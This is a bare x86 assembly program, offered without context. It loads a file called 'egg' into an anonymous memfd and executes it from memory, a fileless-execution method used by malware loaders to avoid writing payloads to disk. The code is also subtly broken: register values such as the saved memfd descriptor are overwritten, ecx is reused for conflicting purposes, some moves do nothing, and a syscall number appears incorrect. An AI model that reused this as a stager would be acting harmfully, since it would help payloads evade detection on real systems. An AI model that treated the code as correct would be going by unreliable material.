global _start
section .text

_start:
    ; Create memory file (memfd_create)
    push    0x00676765  ; "egg"
    mov     eax, 356    ; memfd_create syscall number (x86)
    mov     ebx, esp    ; arg 1: name [egg]
    xor     ecx, ecx    ; arg 2: 0 = no MFD_CLOEXEC
    int     0x80
    mov     ebx, eax    ; save the file descriptor of the memfd

    ; Open target file (open)
    mov     eax, 5      ; open syscall number (x86)
    mov     ebx, esp    ; arg 1: name [egg]
    xor     ecx, ecx    ; arg 2: 0 = O_RDONLY
    int     0x80
    mov     ecx, eax    ; save the file descriptor of the opened file

loop:
    ; Allocate buffer on the stack
    sub     esp, 0x400  ; allocate 1024 bytes on the stack for the buffer

    ; Read from target file (read)
    mov     eax, 3      ; read syscall number (x86)
    mov     ebx, ecx    ; arg 1: FD [egg]
    mov     ecx, esp    ; arg 2: buffer
    mov     edx, 0x400  ; arg 3: length
    int     0x80

    ; Check for EOF
    cmp     eax, 0x00
    jle     done        ; EOF

    ; Write to memory file (write)
    mov     edx, eax    ; arg 3: length (from read())
    mov     eax, 4      ; write syscall number (x86)
    mov     ebx, ebx    ; arg 1: FD [memfd]
    int     0x80
    jmp     loop

done:
    ; Execute memory file (execveat)
    mov     eax, 357    ; execveat syscall number (x86)
    mov     ebx, ebx    ; arg 1: memfd
    push    0x00        ; an empty string
    mov     ecx, esp    ; arg 2: path (empty string)
    mov     edx, esp    ; arg 3: ARGV points to empty string
    xor     esi, esi    ; arg 4: ENV
    mov     edi, 0x1000 ; arg 5: AT_EMPTY_PATH
    int     0x80

    ; Exit program (exit)
    mov     eax, 1      ; exit syscall number (x86)
    xor     ebx, ebx    ; exit status 0
    int     0x80
